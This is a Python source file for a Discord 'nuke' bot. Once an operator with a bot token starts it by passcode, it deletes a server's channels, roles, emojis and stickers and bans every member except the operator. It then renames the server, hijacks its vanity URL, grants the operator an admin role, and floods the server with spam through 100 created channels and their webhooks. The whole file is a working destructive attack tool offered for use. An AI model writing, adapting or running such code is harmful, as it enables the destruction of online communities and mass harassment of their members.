import os
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
import asyncio, aiohttp, time, base64, json, pygame, discord, random, sys
from discord.ext import commands; from io import BytesIO; from PIL import Image
pygame.mixer.init()

def clear_console():
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')

def get_compressed_media(image_path):
    try:
        with Image.open(image_path) as img:
            if img.mode != 'RGB': img = img.convert('RGB')
            img = img.resize((240, 240), Image.Resampling.LANCZOS)
            buffer = BytesIO(); img.save(buffer, format="JPEG", quality=85)
            encoded_string = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return f"data:image/jpeg;base64,{encoded_string}"
    except Exception as e: print(f"Error processing image: {e}")
    return None

PASSCODE = str(random.randint(0000, 9999))
with open("mkii_config.json", "r", encoding="utf-8") as f: config = json.load(f)
ascendancy = commands.Bot(command_prefix=config.get("prefix"), intents=discord.Intents.all())
enable_logo = config.get("enable_logo", "False")
if enable_logo == "True":
    with open("logo.txt", 'r', encoding='utf-8') as file:
        logo = file.read()
        line = "<════════════════════════════════════════════════════[+]════════════════════════════════════════════════════>"
        space = "                                 "
else: logo, line, space = "[!]: Parameter <enable_logo> is False", "", "> "
clear_console()

@ascendancy.event
async def on_ready():
    print(f"\n{logo}")
    print(f'''
> Version: MKII - Transcendence

{line}
{space}Nuke sequence ready <|> Made by Daniel Conclux
{line}

> Passcode: {PASSCODE}
''')

time.sleep(0.1)
TOKEN = config["token"]
CHANNEL_NAME = config["channel_names"]
ROLE_NAME = config["role_names"]
SERVER_NAME = config["server_name"]
MESSAGE_SPAM = config["message_spam"]
WEBHOOK_NAME = config["webhook_names"]
EMOJI_NAME = config["emoji_names"]
VANITY = config["vanity"]
ICON = get_compressed_media("Media\\icon.png")
BANNER = get_compressed_media("Media\\banner.png")
BASE_URL = "https://discord.com/api/v10"
HEADERS = {"Authorization": f"Bot {TOKEN}"}

pygame.mixer.Sound("SFX\\audio1.mp3").play()
print("\n---[ NUKE SEQUENCE INITITATED ]---")

async def terminal_listener():
    await asyncio.sleep(1)
    print(f"\n{line}\n[SYSTEM]: Console Control Active. Leave blank to use Discord only.\n{line}")
    t_guild = input("01: Enter target guild ID (or press Enter): \n")
    if t_guild:
        t_user = input("02: Enter your user ID: \n")
        automator = TranscendenceAutomator()
        await automator.start(t_guild, t_user)

class TranscendenceAutomator:
    def __init__(self):
        self.connector = None
        self.total_queued = 0
        self.limit = asyncio.Semaphore(50)
    async def req(self, session, method, endpoint, json=None, label="", retries=3):
        current_headers = HEADERS.copy()
        if json is not None:
            current_headers["Content-Type"] = "application/json"
        for attempt in range(retries):
            try:
                async with session.request(method, f"{BASE_URL}{endpoint}", json=json, headers=current_headers) as resp:
                    if resp.status in [200, 201, 204]:
                        if label: print(f"[SUCCESS]: {label}")
                        pygame.mixer.Sound("SFX\\audio3.mp3").play()
                        return await resp.json() if resp.status != 204 else True
                    elif resp.status == 429:
                        data = await resp.json(); wait = data.get('retry_after', 1)
                        print(f"[RATE LIMIT]: Retry after {wait}s")
                        pygame.mixer.Sound("SFX\\audio2.mp3").play()
                        await asyncio.sleep(wait)
                        return await self.req(session, method, endpoint, json, label, retries - 1)
                    elif resp.status >= 500: await asyncio.sleep(1); continue
                    elif resp.status >= 403:
                        print(f"[ERROR {resp.status}]: Forbidden error occurred")
                        pygame.mixer.Sound("SFX\\audio2.mp3").play()
                    elif resp.status >= 400:
                        error_data = await resp.json()
                        print(f"[ERROR {resp.status}]: {label} - {error_data.get('message', 'No message')}")
                        pygame.mixer.Sound("SFX\\audio2.mp3").play()
                return None
            except (aiohttp.ClientError, asyncio.TimeoutError, aiohttp.ServerDisconnectedError) as e:
                if attempt < retries - 1: await asyncio.sleep(1); continue
                else:
                    if label: print(f"[ERROR]: {label} failed after {retries} attempts: {e}")
                    pygame.mixer.Sound("SFX\\audio3.mp3").play(); return None
        return None

    async def hijack_vanity(self, session, TARGET_GUILD): await self.req(session, "PATCH", f"/guilds/{TARGET_GUILD}/vanity-url", json={"code": VANITY}, label="Hijacking Vanity URL")

    async def emoji_spam(self, session, TARGET_GUILD): await self.req(session, "POST", f"/guilds/{TARGET_GUILD}/emojis", json={"name": EMOJI_NAME, "image": ICON}, label="Emoji Spam")

    async def saturation(self, session, hook_id, hook_token):
        for _ in range(100000):
            if await self.req(session, "POST", f"/webhooks/{hook_id}/{hook_token}", json={"content": MESSAGE_SPAM}): self.total_queued += 1
            await asyncio.sleep(0) 

    async def reconstruction(self, session, TARGET_GUILD):
        async with self.limit:
            c_name = CHANNEL_NAME
            chan = await self.req(session, "POST", f"/guilds/{TARGET_GUILD}/channels", json={"name": c_name, "type": 0}, label=f"Create Channel: {c_name}")
            if chan:
                payload = {"name": WEBHOOK_NAME, "avatar": ICON}
                hook = await self.req(session, "POST", f"/channels/{chan['id']}/webhooks", json=payload, label=f"Create Webhook in {c_name}")
                if hook: asyncio.create_task(self.saturation(session, hook['id'], hook['token']))

    async def fetch_user_ids(self, session, TARGET_GUILD):
        user_ids = []; last_user_id = 0
        while True:
            batch = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/members?limit=1000&after={last_user_id}", label="Fetch Users")
            if not batch: break
            for member in batch: user_ids.append(member['user']['id'])
            last_user_id = user_ids[-1]
            if len(batch) < 1000: break
        return user_ids

    async def start(self, TARGET_GUILD, AUTHORIZED_USER):
        self.connector = aiohttp.TCPConnector(limit=150)
        async with aiohttp.ClientSession(headers=HEADERS, connector=self.connector) as session:
            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 1: Fetching ] ---")
            g_chans = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/channels", label="Fetch Channels") or []
            print(f"[FETCH]: Total channels: {len(g_chans)}")
            g_roles = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/roles", label="Fetch Roles") or []
            print(f"[FETCH]: Total roles: {len(g_roles)}")
            g_emojis = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/emojis", label="Fetch Emojis") or []
            print(f"[FETCH]: Total emojis: {len(g_emojis)}")
            g_stickers = await self.req(session, "GET", f"/guilds/{TARGET_GUILD}/stickers", label="Fetch Stickers") or []
            print(f"[FETCH]: Total stickers: {len(g_stickers)}")
            g_users = await self.fetch_user_ids(session, TARGET_GUILD)
            print(f"[FETCH]: Total users: {len(g_users)}")

            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 2: Erasure ] ---")
            tasks = [self.req(session, "DELETE", f"/channels/{c['id']}", label=f"Delete Channel: {c['name']}") for c in g_chans]
            tasks += [self.req(session, "DELETE", f"/guilds/{TARGET_GUILD}/roles/{r['id']}", label=f"Delete Role: {r['name']}")
                      for r in g_roles if not r['managed'] and r['name'] != "@everyone"]
            tasks += [self.req(session, "DELETE", f"/guilds/{TARGET_GUILD}/emojis/{e['id']}", label=f"Delete Emoji: {e['name']}") for e in g_emojis]
            tasks += [self.req(session, "DELETE", f"/guilds/{TARGET_GUILD}/stickers/{s['id']}", label=f"Delete Sticker: {s['name']}") for s in g_stickers]
            for u in g_users:
                if u == AUTHORIZED_USER: continue
                tasks.append(self.req(session, "PUT", f"/guilds/{TARGET_GUILD}/bans/{u}", json={}, label=f"Ban User: {u}"))
            await asyncio.gather(*tasks)

            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 3: Defamation ] ---")
            await self.req(session, "PATCH", f"/guilds/{TARGET_GUILD}", json={"name": SERVER_NAME, "icon": ICON, "banner": BANNER}, label="Server Identity Updated")
            await self.hijack_vanity(session, TARGET_GUILD)

            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 4: Reconstruction ] ---")
            role = await self.req(session, "POST", f"/guilds/{TARGET_GUILD}/ roles", json={"name": ROLE_NAME, "permissions": "8"}, label=f"Create Admin Role: {ROLE_NAME}")
            if role: await self.req(session, "PUT", f"/guilds/{TARGET_GUILD}/members/{AUTHORIZED_USER}/roles/{role['id']}")
            build_tasks = [self.reconstruction(session, TARGET_GUILD) for _ in range(100)]; emoji_tasks = [self.emoji_spam(session, TARGET_GUILD) for _ in range(100)]
            await asyncio.gather(*(build_tasks + emoji_tasks))

            pygame.mixer.Sound("SFX\\audio1.mp3").play()
            print("\n--- [ Phase 5: Saturation ] ---")

@ascendancy.command()
async def devastate(ctx, passcode: str):
    TARGET_GUILD = str(ctx.guild.id)
    AUTHORIZED_USER = str(ctx.author.id)
    if passcode == PASSCODE:
        await ctx.message.delete
        try: await ctx.author.send(f"Nuke sequence has been initiated for {TARGET_GUILD}")
        except discord.Forbidden: pass
        automator = TranscendenceAutomator()
        await automator.start(TARGET_GUILD, AUTHORIZED_USER)

if __name__ == "__main__":
    try:
        ascendancy.run(TOKEN)
    except Exception as e:
        pygame.mixer.Sound("SFX\\audio2.mp3").play()
        print(f"\n[X]: Failed to start: {e}\n")

if RuntimeError:
    pygame.mixer.Sound("SFX\\audio2.mp3").play()
    print(f"\n[X]: Error occurred, terminating session in 1 second\n")
    time.sleep(1)